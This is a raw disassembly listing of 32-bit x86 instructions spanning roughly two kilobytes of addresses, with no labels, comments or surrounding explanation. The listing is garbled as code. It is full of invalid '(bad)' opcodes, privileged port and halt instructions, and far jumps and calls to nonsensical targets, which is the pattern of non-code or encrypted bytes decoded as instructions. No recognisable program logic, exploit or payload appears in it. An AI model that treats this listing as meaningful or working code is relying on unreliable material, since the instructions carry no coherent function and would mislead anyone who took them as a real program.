  40d4e6:	jbe    0x40d4c6
  40d4e8:	das    
  40d4e9:	sub    BYTE PTR [ecx-0x35],dl
  40d4ec:	xchg   edx,eax
  40d4ed:	and    DWORD PTR es:[ecx+0x1d],0x3fcde3a7
  40d4f5:	adc    ecx,edi
  40d4f7:	jle    0x40d4a6
  40d4f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4fa:	mov    ebx,ds
  40d4fc:	xchg   esp,eax
  40d4fd:	je     0x40d53c
  40d4ff:	cmp    BYTE PTR [edi+esi*2+0x5b],ah
  40d503:	and    BYTE PTR [edx-0x4ca31a3e],dl
  40d509:	(bad)  
  40d50a:	or     eax,0x58398233
  40d50f:	sub    al,0xe3
  40d511:	imul   ecx,ebp,0xf75550d7
  40d517:	sbb    eax,0x17c9fbeb
  40d51c:	jne    0x40d574
  40d51e:	and    al,0x88
  40d520:	mov    bh,0x19
  40d522:	inc    ecx
  40d523:	mov    ebx,0xee73220
  40d528:	icebp  
  40d529:	jne    0x40d578
  40d52b:	sahf   
  40d52c:	mov    dh,0xc8
  40d52e:	imul   esp,DWORD PTR [esi-0x36a52380],0x940822eb
  40d538:	mov    al,0xdf
  40d53a:	jle    0x40d523
  40d53c:	xor    al,0x5d
  40d53e:	or     bl,0x7
  40d541:	inc    esp
  40d542:	out    0x9c,eax
  40d544:	sti    
  40d545:	setbe  BYTE PTR es:[esi*1-0x78a7a86d]
  40d54e:	push   ss
  40d54f:	retf   
  40d550:	rcl    ch,cl
  40d552:	stos   BYTE PTR es:[edi],al
  40d553:	(bad)  
  40d554:	xor    al,0x36
  40d556:	arpl   WORD PTR [ecx+0x64],dx
  40d559:	fcomp  DWORD PTR [ebp+0x5c]
  40d55c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d55d:	fdivr  st,st(2)
  40d55f:	push   esi
  40d560:	mov    ds:0x3306aed1,al
  40d565:	push   0x18fd99bd
  40d56a:	mov    BYTE PTR [esp+eiz*2+0x57aee53c],bh
  40d571:	adc    eax,0x7a41e0c6
  40d576:	cmp    al,0x79
  40d578:	push   eax
  40d579:	push   ebx
  40d57a:	inc    edi
  40d57b:	jns    0x40d504
  40d57d:	repz push cs
  40d57f:	(bad)  [eax]
  40d581:	nop
  40d582:	hlt    
  40d583:	jno    0x40d57f
  40d585:	xor    eax,0x173631e9
  40d58a:	sbb    BYTE PTR [ebp+ebp*8-0x46],0xe9
  40d58f:	xchg   DWORD PTR [ebp+0x5316245b],edx
  40d595:	shr    BYTE PTR [ebp+eax*4-0x63028de7],0xd0
  40d59d:	sub    eax,DWORD PTR [edx-0x7ce8c136]
  40d5a3:	test   bl,0x97
  40d5a6:	add    BYTE PTR [esi+0x1c768944],0x96
  40d5ad:	mov    dl,0x65
  40d5af:	mov    bh,0x42
  40d5b1:	cmp    BYTE PTR [ecx],al
  40d5b3:	shl    ah,0x7a
  40d5b6:	iret   
  40d5b7:	xor    eax,0x929431e7
  40d5bc:	add    al,0xea
  40d5be:	shr    ah,1
  40d5c0:	sar    BYTE PTR [eax+0x7d],cl
  40d5c3:	push   0x4055db6
  40d5c8:	push   cs
  40d5c9:	pop    ebx
  40d5ca:	xchg   ecx,eax
  40d5cb:	mov    edx,0x4e64a37e
  40d5d0:	push   di
  40d5d2:	add    DWORD PTR fs:[edi-0x575e48f7],ebp
  40d5d9:	mov    cl,0x4c
  40d5db:	nop
  40d5dc:	mov    eax,0x6272b707
  40d5e1:	jecxz  0x40d58a
  40d5e3:	add    bh,BYTE PTR [ebp+edi*8+0x15]
  40d5e7:	dec    esi
  40d5e8:	repz xchg edx,eax
  40d5ea:	jle    0x40d627
  40d5ec:	xchg   esi,eax
  40d5ed:	xor    al,BYTE PTR [ebx+0x1e9d689a]
  40d5f3:	push   ds
  40d5f4:	arpl   WORD PTR [ebx+edi*1],si
  40d5f7:	fs jle 0x40d599
  40d5fa:	jo     0x40d5f2
  40d5fc:	out    dx,al
  40d5fd:	mov    edi,0x9aca0dae
  40d602:	mov    esp,0xf6e50cd1
  40d607:	jmp    0xbe9a8ad5
  40d60c:	mov    ebp,0xd0c0aec5
  40d611:	dec    ebp
  40d612:	fcmovb st,st(2)
  40d614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d615:	jbe    0x40d5c0
  40d617:	pushf  
  40d618:	in     eax,0xac
  40d61a:	in     eax,0xcc
  40d61c:	add    eax,DWORD PTR [ebx-0x7d]
  40d61f:	pop    ecx
  40d620:	or     al,0x7a
  40d622:	test   DWORD PTR [ebp+0x78da0c58],ebp
  40d628:	out    dx,eax
  40d629:	adc    eax,0x19b7b538
  40d62e:	pop    es
  40d62f:	cld    
  40d630:	mul    esp
  40d632:	adc    ch,BYTE PTR [ecx]
  40d634:	cli    
  40d635:	ins    DWORD PTR es:[edi],dx
  40d636:	cmp    eax,0x490beaa
  40d63b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d63c:	mov    WORD PTR ds:0x9f4247ad,?
  40d642:	jmp    0x6dc4:0x9bebe290
  40d649:	and    DWORD PTR [edx+0x56],edx
  40d64c:	aad    0xa6
  40d64e:	mov    dl,0x46
  40d650:	bnd jg 0x40d5dd
  40d653:	(bad)  
  40d654:	dec    esi
  40d655:	out    dx,eax
  40d656:	add    ecx,DWORD PTR [eax+esi*4+0x60]
  40d65a:	adc    DWORD PTR [edx-0x1098224d],ebp
  40d660:	cmp    DWORD PTR [ecx],ecx
  40d662:	fbld   TBYTE PTR [esi+0x28]
  40d665:	pop    ss
  40d666:	push   ss
  40d667:	jae    0x40d68c
  40d669:	cmp    dh,bl
  40d66b:	sbb    eax,DWORD PTR [edi-0x70]
  40d66e:	lea    esi,[ecx-0x4a]
  40d671:	xor    esi,esp
  40d673:	popa   
  40d674:	lods   ax,WORD PTR ds:[esi]
  40d676:	add    dl,ch
  40d678:	mov    ds:0xdba7fd2b,eax
  40d67d:	call   0x913c:0xa3cc2ddb
  40d684:	cmp    DWORD PTR ds:[edi-0x7e992b54],edi
  40d68b:	sbb    al,0x28
  40d68d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d68e:	mov    al,ds:0x3792af2b
  40d694:	jecxz  0x40d68c
  40d696:	sbb    al,0x99
  40d698:	jge    0x40d62c
  40d69a:	std    
  40d69b:	test   BYTE PTR gs:[edx+0xadc9ec2],dl
  40d6a2:	xchg   BYTE PTR [ebp-0x45a52adc],dh
  40d6a8:	out    0x57,eax
  40d6aa:	mov    ah,0x77
  40d6ac:	sbb    edi,edx
  40d6ae:	xchg   ebx,eax
  40d6af:	test   eax,0xb99167c6
  40d6b4:	adc    al,0x6d
  40d6b6:	sub    DWORD PTR [eax-0x26f695d7],edx
  40d6bc:	imul   esi,DWORD PTR [edx-0xc4af3b9],0xe327431e
  40d6c6:	xchg   al,dh
  40d6c8:	shl    DWORD PTR [ebx-0x217cb10e],0x3
  40d6cf:	add    DWORD PTR [ebp+0x407fefc0],edi
  40d6d5:	mov    al,0x47
  40d6d7:	fsubr  DWORD PTR [edx-0x1c]
  40d6da:	sbb    ebp,DWORD PTR [ebx-0x35]
  40d6dd:	rol    DWORD PTR [esp+esi*8+0x25],1
  40d6e1:	add    esp,ebp
  40d6e3:	mov    ecx,0x3e6f7133
  40d6e8:	jo     0x40d678
  40d6ea:	call   0xde1a:0xa16db0cc
  40d6f1:	push   0x58
  40d6f3:	stos   DWORD PTR es:[edi],eax
  40d6f4:	mov    cl,BYTE PTR [eax]
  40d6f6:	cli    
  40d6f7:	lds    edx,FWORD PTR [ebx]
  40d6f9:	test   DWORD PTR [esp+esi*2-0x473703c1],esp
  40d700:	adc    ah,ah
  40d702:	xchg   ebx,eax
  40d703:	sar    ebx,1
  40d705:	loopne 0x40d734
  40d707:	shr    DWORD PTR [esi+0x51],1
  40d70a:	mov    edi,0xbae75731
  40d70f:	aas    
  40d710:	push   eax
  40d711:	mov    ds:0x46bec512,eax
  40d716:	sti    
  40d717:	push   esp
  40d718:	loope  0x40d724
  40d71a:	mov    ch,0xec
  40d71c:	imul   ebp,DWORD PTR [edi-0x50cb673a],0x7fd19c76
  40d726:	xchg   esi,eax
  40d727:	sbb    BYTE PTR [ebp+0x76],dl
  40d72a:	(bad)  
  40d72b:	shl    DWORD PTR [ebp-0x40bcae23],cl
  40d731:	adc    al,0xcc
  40d733:	iret   
  40d734:	stos   BYTE PTR es:[edi],al
  40d735:	cdq    
  40d736:	xchg   DWORD PTR [esi],edi
  40d738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d739:	push   esi
  40d73a:	ds mov bl,0xbf
  40d73d:	pop    esp
  40d73e:	(bad)  
  40d73f:	shl    BYTE PTR [ecx+edi*8],0xc0
  40d743:	es ss jg 0x40d6d6
  40d747:	fnsave [ecx+esi*1-0x72036bc1]
  40d74e:	push   es
  40d74f:	jge    0x40d79e
  40d751:	pop    ebp
  40d752:	sbb    BYTE PTR [ebp-0x4f],al
  40d755:	sub    eax,0xbb35485b
  40d75a:	mov    ecx,0x556389c9
  40d75f:	ret    0xacd1
  40d762:	jns    0x40d70e
  40d764:	call   0x10992b3d
  40d769:	cmp    bl,dh
  40d76b:	jnp    0x40d6fd
  40d76d:	test   eax,0xc3327281
  40d772:	or     al,0x23
  40d774:	shl    BYTE PTR [ecx+0x454e8f88],1
  40d77a:	adc    ch,ch
  40d77c:	repnz lods eax,DWORD PTR ds:[esi]
  40d77e:	xor    eax,0xb89432a4
  40d783:	push   esi
  40d784:	mov    ecx,0xb6ebd835
  40d789:	out    0xde,al
  40d78b:	or     cl,BYTE PTR [edi]
  40d78d:	lods   al,BYTE PTR ds:[esi]
  40d78e:	lods   eax,DWORD PTR ds:[esi]
  40d78f:	cdq    
  40d790:	pusha  
  40d791:	mov    al,ds:0x4e960da2
  40d796:	dec    ecx
  40d797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d798:	stc    
  40d799:	mov    ch,cl
  40d79b:	ror    BYTE PTR [ecx+0x55e81dd7],cl
  40d7a1:	adc    al,0x56
  40d7a3:	or     DWORD PTR [ebp+0x29],edi
  40d7a6:	lods   al,BYTE PTR ds:[esi]
  40d7a7:	in     al,0xaf
  40d7a9:	(bad)
  40d7ac:	mov    eax,ds:0xd9db0c28
  40d7b1:	out    0xae,eax
  40d7b3:	cmc    
  40d7b4:	das    
  40d7b5:	fcom   DWORD PTR [edx+ecx*4+0x1]
  40d7b9:	in     eax,0x18
  40d7bb:	(bad)  
  40d7bc:	sti    
  40d7bd:	dec    edi
  40d7be:	xchg   DWORD PTR ds:0x77becda,eax
  40d7c4:	xor    DWORD PTR [esi+0x3a],esp
  40d7c7:	pop    edi
  40d7c8:	jo     0x40d7ac
  40d7ca:	jle    0x40d7aa
  40d7cc:	cmp    BYTE PTR [ebx+0x15],cl
  40d7cf:	ins    DWORD PTR es:[edi],dx
  40d7d0:	mov    bl,0xaf
  40d7d2:	cdq    
  40d7d3:	(bad)  
  40d7d4:	add    esi,esp
  40d7d6:	jne    0x40d80d
  40d7d8:	mov    edi,0xb9da4fb7
  40d7dd:	push   ecx
  40d7de:	jmp    0x9f3d27f3
  40d7e3:	les    ebp,FWORD PTR [ecx+0xc]
  40d7e6:	mov    ecx,0x8ada350d
  40d7eb:	call   0xa9392e65
  40d7f0:	rcr    DWORD PTR [edx+edi*4+0x37ba77e5],0xbf
  40d7f8:	out    dx,al
  40d7f9:	idiv   DWORD PTR [ecx+eiz*8]
  40d7fc:	add    al,0x8
  40d7fe:	mov    ss:0x88c2189f,eax
  40d804:	lds    eax,FWORD PTR [ebx+0x3c]
  40d807:	cmp    al,0x2f
  40d809:	mov    al,BYTE PTR [edx+0x457b271]
  40d80f:	loope  0x40d813
  40d811:	mov    ecx,0x9572d1d3
  40d816:	lods   al,BYTE PTR ds:[esi]
  40d817:	xchg   BYTE PTR [eax+0x32],cl
  40d81a:	add    DWORD PTR [ebx+0xa22a63d],0xc
  40d821:	mov    ebp,0x247fa097
  40d826:	mov    ds:0x73cc52a,eax
  40d82b:	adc    DWORD PTR [edi+ecx*2],0x9e304474
  40d832:	aaa    
  40d833:	call   0xba6afab4
  40d838:	sub    BYTE PTR [edx+ebx*2+0xd],dh
  40d83c:	retf   
  40d83d:	inc    esp
  40d83e:	add    bh,BYTE PTR [edx]
  40d840:	pop    ecx
  40d841:	add    eax,0xdc214bd4
  40d846:	or     eax,0x47b0f5c7
  40d84b:	aaa    
  40d84c:	push   0x9d2d940d
  40d851:	test   al,0x5e
  40d853:	push   edx
  40d854:	or     al,0xf9
  40d856:	addr16 inc esi
  40d858:	out    dx,eax
  40d859:	push   ss
  40d85a:	(bad)  
  40d85b:	les    ebx,FWORD PTR [eax-0x1e83fcf9]
  40d861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d862:	cmp    DWORD PTR [ebp-0x14],0xffffffad
  40d866:	jl     0x40d828
  40d868:	sub    eax,0x9a891d8a
  40d86d:	add    DWORD PTR [eax+0x57],ebp
  40d870:	jl     0x40d822
  40d872:	lahf   
  40d873:	sbb    eax,0xb1f4e1aa
  40d878:	sub    ah,BYTE PTR [ebx+0x47e81444]
  40d87e:	scas   eax,DWORD PTR es:[edi]
  40d87f:	lods   eax,DWORD PTR ds:[esi]
  40d880:	aas    
  40d881:	inc    ecx
  40d882:	lahf   
  40d883:	jo     0x40d823
  40d885:	test   eax,0x32f8b67
  40d88a:	lods   al,BYTE PTR ds:[esi]
  40d88b:	jo     0x40d8fe
  40d88d:	imul   esi,ebx,0xb73ef66e
  40d893:	inc    eax
  40d894:	je     0x40d8ca
  40d896:	cmp    ah,BYTE PTR [eax]
  40d898:	pop    edi
  40d899:	ret    
  40d89a:	fs fdiv st,st(3)
  40d89d:	data16 je 0x40d8e1
  40d8a0:	hlt    
  40d8a1:	(bad)  
  40d8a2:	stos   BYTE PTR es:[edi],al
  40d8a3:	imul   ebx,DWORD PTR [edx+eax*4-0x72ce7186],0x76
  40d8ab:	and    BYTE PTR [edi],0x9f
  40d8ae:	pop    ds
  40d8af:	push   0x3d
  40d8b1:	jb     0x40d8f7
  40d8b3:	(bad)  
  40d8b4:	clc    
  40d8b5:	ins    DWORD PTR es:[edi],dx
  40d8b6:	sub    al,0x32
  40d8b8:	adc    ebp,esp
  40d8ba:	test   eax,0x670b32d2
  40d8bf:	push   esp
  40d8c0:	or     BYTE PTR [edx+0x26],ch
  40d8c3:	cs mov eax,0x4993f08d
  40d8c9:	ror    BYTE PTR [ecx],1
  40d8cb:	lahf   
  40d8cc:	or     al,0x2b
  40d8ce:	xchg   esp,eax
  40d8cf:	sub    DWORD PTR [edi-0x76],ebp
  40d8d2:	push   ebp
  40d8d3:	or     DWORD PTR [eax+edi*1+0x163d8555],0xffffffd1
  40d8db:	xor    esp,DWORD PTR [ebx-0x23]
  40d8de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8df:	call   0xe5d4:0x7ebeea1d
  40d8e6:	add    bl,BYTE PTR [ecx]
  40d8e8:	call   0x6eb02b23
  40d8ed:	scas   eax,DWORD PTR es:[edi]
  40d8ee:	jmp    0x58e437c3
  40d8f3:	jmp    0x40d8fa
  40d8f5:	sbb    esp,DWORD PTR [eax+0x19]
  40d8f8:	fisubr DWORD PTR [edx+eiz*8-0x61]
  40d8fc:	cmp    al,0x95
  40d8fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8ff:	bound  eax,QWORD PTR [edx+0x330feecc]
  40d905:	sbb    al,0xfb
  40d907:	xchg   edi,eax
  40d908:	or     dl,ch
  40d90a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d90b:	dec    ebp
  40d90c:	mov    WORD PTR [ecx+ebx*8],gs
  40d90f:	mov    esp,0x2f50d24b
  40d914:	or     al,0x59
  40d916:	mov    dh,0xce
  40d918:	or     al,BYTE PTR [eax-0x4648951]
  40d91e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d91f:	dec    esi
  40d920:	pop    ds
  40d921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d922:	pushf  
  40d923:	jnp    0x40d8e3
  40d925:	mov    ch,0x5c
  40d927:	mov    al,ds:0x4a3d6c70
  40d92c:	pop    esp
  40d92d:	inc    eax
  40d92e:	mov    cl,0x79
  40d930:	aas    
  40d931:	add    BYTE PTR [edx+0x4efe720f],bl
  40d937:	clc    
  40d938:	dec    ebp
  40d939:	mov    ebp,0x9a958308
  40d93e:	ja     0x40d8c5
  40d940:	repnz mov esp,0xbb072b9e
  40d946:	mov    edx,0xe3cb0187
  40d94b:	call   0x806f7612
  40d950:	mov    bh,0xc2
  40d952:	into   
  40d953:	sbb    eax,DWORD PTR [ebx]
  40d955:	sbb    bh,cl
  40d957:	shl    BYTE PTR [edx-0xb76d56a],0x63
  40d95e:	xor    DWORD PTR [ebx],ebp
  40d960:	sub    edi,ecx
  40d962:	xor    DWORD PTR [eax+edx*4+0x6cdb6d20],ebx
  40d969:	xor    eax,0xfaa3e0d5
  40d96e:	mov    al,0x32
  40d970:	push   ebx
  40d971:	ins    BYTE PTR es:[edi],dx
  40d972:	push   ebp
  40d973:	mov    ecx,0x1093c5ba
  40d978:	mov    eax,ds:0x3af35d77
  40d97d:	pop    esp
  40d97e:	cwde   
  40d97f:	scas   eax,DWORD PTR es:[edi]
  40d980:	std    
  40d981:	shl    DWORD PTR [ecx-0x8],1
  40d984:	pop    ebx
  40d985:	pop    edi
  40d986:	or     al,0x1c
  40d988:	dec    esi
  40d989:	cs js  0x40d9e6
  40d98c:	es add al,0xca
  40d98f:	retf   
  40d990:	outs   dx,BYTE PTR ds:[esi]
  40d991:	jl     0x40d96c
  40d993:	fwait
  40d994:	mov    dh,0x6c
  40d996:	fild   DWORD PTR [edx-0x32]
  40d999:	cmppd  xmm4,XMMWORD PTR [esi-0x63be3072],0xf8
  40d9a2:	imul   BYTE PTR [esi-0x73]
  40d9a5:	dec    eax
  40d9a6:	inc    eax
  40d9a7:	mov    cl,0x8a
  40d9a9:	xchg   esp,eax
  40d9aa:	sub    al,0x92
  40d9ac:	ins    DWORD PTR es:[edi],dx
  40d9ad:	mov    ?,esp
  40d9af:	test   eax,ebp
  40d9b1:	(bad)
  40d9b4:	fisttp WORD PTR [ebp+0x65]
  40d9b7:	ret    
  40d9b8:	xchg   ebp,eax
  40d9b9:	pop    ebp
  40d9ba:	jno    0x40d9b5
  40d9bc:	in     eax,dx
  40d9bd:	mov    WORD PTR [ebx],gs
  40d9bf:	mov    WORD PTR [edx+edi*2],ss
  40d9c2:	mov    dh,al
  40d9c4:	or     ebp,DWORD PTR [ebx]
  40d9c6:	xchg   DWORD PTR [esi+0x69],ecx
  40d9c9:	cwde   
  40d9ca:	lods   al,BYTE PTR ds:[esi]
  40d9cb:	aad    0xf6
  40d9cd:	or     BYTE PTR [esi-0x70dcf0b5],dl
  40d9d3:	adc    BYTE PTR [ecx+0x7b],ch
  40d9d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9d7:	(bad)  [ecx+0x4]
  40d9da:	pop    ds
  40d9db:	jmp    0x410b655d
  40d9e0:	add    BYTE PTR [eax+0x5b],bl
  40d9e3:	aaa    
  40d9e4:	mov    fs,WORD PTR [eax+0x39ae57fa]
  40d9ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9eb:	out    dx,al
  40d9ec:	and    al,0xbd
  40d9ee:	add    esp,DWORD PTR [edx+ecx*4-0x44]
  40d9f2:	xchg   edi,eax
  40d9f3:	ins    BYTE PTR es:[edi],dx
  40d9f4:	add    DWORD PTR [edx-0x6],0xffffffef
  40d9f8:	inc    edx
  40d9f9:	lods   eax,DWORD PTR ds:[esi]
  40d9fa:	push   ebx
  40d9fb:	or     DWORD PTR [edx+ecx*2],0x535f70a2
  40da02:	dec    esp
  40da03:	jl     0x40d9b3
  40da05:	sbb    dl,BYTE PTR [ecx+eax*4-0x37]
  40da09:	pop    ss
  40da0a:	mov    al,ds:0xae0c9307
  40da0f:	push   es
  40da10:	cmpxchg8b QWORD PTR [eax]
  40da13:	repnz dec edx
  40da15:	dec    esp
  40da16:	push   eax
  40da17:	enter  0x771a,0xd5
  40da1b:	aad    0x3c
  40da1d:	sub    BYTE PTR [eax],bh
  40da1f:	imul   bl
  40da21:	pop    ecx
  40da22:	xor    esp,DWORD PTR [ebp+0x10677345]
  40da28:	out    dx,al
  40da29:	imul   ecx,DWORD PTR ds:0x96159318,0xffffffdc
  40da30:	push   esp
  40da31:	push   cs
  40da32:	dec    esp
  40da33:	adc    DWORD PTR [eax+0x227e8978],ebp
  40da39:	push   es
  40da3a:	adc    ch,BYTE PTR [edx+0x48c5ff58]
  40da40:	ja     0x40d9dc
  40da42:	or     DWORD PTR [ebx-0x8],esp
  40da45:	inc    ebp
  40da46:	mov    eax,ds:0xf09f113a
  40da4b:	add    BYTE PTR [ebx-0x1],ch
  40da4e:	inc    ebx
  40da4f:	mov    al,gs:0x3e6cb8fd
  40da55:	test   DWORD PTR [eax],ebp
  40da57:	cli    
  40da58:	mov    ds:0x152814e6,al
  40da5d:	cdq    
  40da5e:	inc    esp
  40da5f:	adc    BYTE PTR [ecx+0x53],0xda
  40da63:	pmulhw mm2,QWORD PTR [eax+ebp*4-0x488afc37]
  40da6b:	lods   eax,DWORD PTR ds:[esi]
  40da6c:	add    ecx,DWORD PTR [edx+ecx*8]
  40da6f:	xor    BYTE PTR [eax+ecx*8+0x3b],ch
  40da73:	jecxz  0x40da66
  40da75:	mov    cl,al
  40da77:	or     DWORD PTR [esi+0x7d],esp
  40da7a:	test   edi,ebp
  40da7c:	push   esi
  40da7d:	retf   
  40da7e:	add    eax,0x202955f5
  40da83:	and    bl,BYTE PTR [esi+0x4d80396a]
  40da89:	push   ebx
  40da8a:	xchg   ecx,eax
  40da8b:	inc    edi
  40da8c:	xchg   esi,eax
  40da8d:	bswap  edi
  40da8f:	stc    
  40da90:	push   edx
  40da91:	jmp    0xfed0:0x4f812887
  40da98:	sbb    ch,BYTE PTR [edi]
  40da9a:	in     al,dx
  40da9b:	inc    edi
  40da9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da9d:	mov    ds:0x119117a5,al
  40daa2:	out    0xe0,eax
  40daa4:	inc    ecx
  40daa5:	(bad)  
  40daa7:	cs sti 
  40daa9:	and    al,0xb0
  40daab:	inc    esp
  40daac:	or     ebx,DWORD PTR [edi+0x2c]
  40daaf:	mov    ebp,0x44251b86
  40dab4:	addr16 sub al,0x55
  40dab7:	test   al,0xe3
  40dab9:	inc    ecx
  40daba:	enter  0xd5ab,0xb
  40dabe:	ds cmp al,0x9c
  40dac1:	sub    al,bh
  40dac3:	stos   DWORD PTR es:[edi],eax
  40dac4:	jmp    0x8409bbdf
  40dac9:	pop    esi
  40daca:	les    ebp,FWORD PTR [ebp-0x7b]
  40dacd:	cdq    
  40dace:	mov    eax,0x279cc43c
  40dad3:	push   0x2a42b9bf
  40dad8:	or     al,0xb7
  40dada:	dec    ecx
  40dadb:	in     al,dx
  40dadc:	jg     0x40dacc
  40dade:	and    BYTE PTR [ecx+0x31],cl
  40dae1:	ss and al,0x60
  40dae4:	cmp    DWORD PTR [edi+0x42],esp
  40dae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dae8:	clc    
  40dae9:	cli    
  40daea:	into   
  40daeb:	push   ds
  40daec:	lock sbb BYTE PTR [ebp-0x79c6b9cd],dh
  40daf3:	arpl   WORD PTR [edx+ebx*8+0xdb9eba9],bx
  40dafa:	stc    
  40dafb:	pop    ebx
  40dafc:	sbb    cl,BYTE PTR [esi]
  40dafe:	popf   
  40daff:	or     ebp,ecx
  40db01:	pop    edi
  40db02:	retf   
  40db03:	dec    ecx
  40db04:	push   esp
  40db05:	adc    DWORD PTR [edx+0x59d0f7d9],ebx
  40db0b:	mov    ecx,cs
  40db0d:	xor    ch,dh
  40db0f:	out    dx,eax
  40db10:	shr    BYTE PTR [esi+0x7],0x74
  40db14:	mov    bl,0x1
  40db16:	das    
  40db17:	adc    al,0x89
  40db19:	add    ecx,DWORD PTR [edx-0x13265e8c]
  40db1f:	inc    ebp
  40db20:	fwait
  40db21:	imul   edi,DWORD PTR [edi],0x1e
  40db24:	imul   ebx,DWORD PTR [ebx],0xb5a5e1d7
  40db2a:	cmp    eax,0xaf5c20e1
  40db2f:	push   edi
  40db30:	push   ds
  40db31:	mov    ecx,0xb9bcf748
  40db36:	add    eax,0x967b012b
  40db3b:	jbe    0x40db83
  40db3d:	int3   
  40db3e:	stos   BYTE PTR es:[edi],al
  40db3f:	dec    edx
  40db40:	scas   eax,DWORD PTR es:[edi]
  40db41:	pop    esp
  40db42:	enter  0x7d0d,0x88
  40db46:	popf   
  40db47:	gs rcr al,1
  40db4a:	call   0xba6ab3
  40db4f:	hlt    
  40db50:	dec    ecx
  40db51:	int3   
  40db52:	cwde   
  40db53:	pop    ebx
  40db54:	gs leave 
  40db56:	lahf   
  40db57:	dec    edx
  40db58:	xchg   edx,eax
  40db59:	(bad)  
  40db5a:	shl    DWORD PTR [edx-0x782fa5c6],0xb6
  40db61:	arpl   WORD PTR [ebp-0x78],ax
  40db64:	or     DWORD PTR [ecx-0x1a],ebp
  40db67:	nop
  40db68:	add    DWORD PTR [esi-0x16],ebx
  40db6b:	adc    DWORD PTR [edi],0xfffffff4
  40db6e:	adc    ah,BYTE PTR [ecx+esi*1]
  40db71:	aas    
  40db72:	jmp    0xb288:0xdcb91c81
  40db79:	xchg   ecx,eax
  40db7a:	dec    esp
  40db7b:	xor    BYTE PTR [eax+0x36],bl
  40db7e:	mov    bh,0x69
  40db80:	jl     0x40dbd0
  40db82:	xchg   ecx,eax
  40db83:	jno    0x40db62
  40db85:	(bad)  
  40db86:	mov    bl,0x6c
  40db88:	xor    bl,ah
  40db8a:	add    bl,BYTE PTR [ecx]
  40db8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db8d:	cmp    cl,BYTE PTR [edx-0x7876b26e]
  40db93:	in     eax,dx
  40db94:	rcl    bl,cl
  40db96:	in     al,0x4d
  40db98:	mov    edx,0x1f694864
  40db9d:	sub    dl,dh
  40db9f:	pushf  
  40dba0:	sub    dh,ah
  40dba2:	sub    dl,BYTE PTR [ecx+0x75]
  40dba5:	push   esp
  40dba6:	aas    
  40dba7:	adc    BYTE PTR fs:[ebp-0x63b3ee80],dh
  40dbae:	mov    ecx,0x3eaf4b9
  40dbb3:	inc    ebx
  40dbb4:	stos   BYTE PTR es:[edi],al
  40dbb5:	pop    ds
  40dbb6:	std    
  40dbb7:	jg     0x40dc23
  40dbb9:	lods   eax,DWORD PTR ds:[esi]
  40dbba:	xor    BYTE PTR ds:0x4471ecda,bh
  40dbc0:	and    BYTE PTR ds:0x60a1a9be,0x1c
  40dbc7:	fisubr DWORD PTR [eax-0x9a0d52b]
  40dbcd:	nop
  40dbce:	jl     0x40dc3f
  40dbd0:	das    
  40dbd1:	rol    ecx,cl
  40dbd3:	sub    dl,BYTE PTR ds:0x7b9fbdf9
  40dbd9:	sub    al,0x82
  40dbdb:	jp     0x40dc28
  40dbdd:	in     eax,0x20
  40dbdf:	cmp    eax,0x156f42f7
  40dbe4:	call   0xbf5d80ad
  40dbe9:	inc    ecx
  40dbea:	mov    edi,es
  40dbec:	mov    ?,WORD PTR [esi+0x77]
  40dbef:	lock sbb BYTE PTR [esi+0xa],dl
  40dbf3:	or     ah,BYTE PTR [esi+0x2e1402bb]
  40dbf9:	push   ss
  40dbfa:	xchg   esi,eax
  40dbfb:	or     BYTE PTR [ebx-0x4b],0xdd
  40dbff:	push   edi
  40dc00:	jo     0x40dbd9
  40dc02:	repnz mov bh,0xdb
  40dc05:	repnz adc ah,BYTE PTR [esi+0x6ddfa40c]
  40dc0c:	ja     0x40dbfb
  40dc0e:	mov    ebx,0x317f80bb
  40dc13:	or     eax,0x2b0892fb
  40dc18:	in     al,0x1
  40dc1a:	mov    ds:0x3b15008,eax
  40dc1f:	add    bl,bl
  40dc21:	das    
  40dc22:	out    0xd,eax
  40dc24:	push   edi
  40dc25:	fstp   DWORD PTR [eax]
  40dc27:	mov    ebp,0xc193b99a
  40dc2c:	pop    edx
  40dc2d:	call   0xbc59c8b3
  40dc32:	inc    esi
  40dc33:	pop    edi
  40dc34:	cdq    
  40dc35:	push   ss
  40dc36:	mov    dl,0xee
  40dc38:	cs imul esp,edx,0x39
  40dc3c:	jb     0x40dc83
  40dc3e:	call   0xd99d07e3
  40dc43:	std    
  40dc44:	sti    
  40dc45:	fisttp DWORD PTR [ecx+0x60a62e2]
  40dc4b:	xchg   ebx,eax
  40dc4c:	fimul  WORD PTR [ebx]
  40dc4e:	mov    WORD PTR [esi+ebp*8],gs
  40dc51:	or     BYTE PTR [esi+0x62832a03],dh
  40dc57:	mov    ax,WORD PTR [ebp+edi*8+0x3e]
  40dc5c:	pop    eax
  40dc5d:	leave  
  40dc5e:	mov    dh,0x62
  40dc60:	or     al,0x8f
  40dc62:	sub    al,al
  40dc64:	fmulp  st(6),st
  40dc66:	int3   
  40dc67:	shl    bh,1
  40dc69:	mov    cl,0xd7
  40dc6b:	adc    DWORD PTR [ecx+edi*4],ebp
  40dc6e:	xor    al,ch
  40dc70:	bound  edi,QWORD PTR [ebp-0x63]
  40dc73:	dec    ecx
  40dc74:	xchg   ebp,eax
  40dc75:	mov    esi,0xe03c8375
  40dc7a:	jae    0x40dc8e
  40dc7c:	loope  0x40dcbd
  40dc7e:	adc    eax,0x313da43f
  40dc83:	jmp    0x2a50bce8
  40dc88:	add    ecx,DWORD PTR [ecx+0x14de1391]
  40dc8e:	push   edx
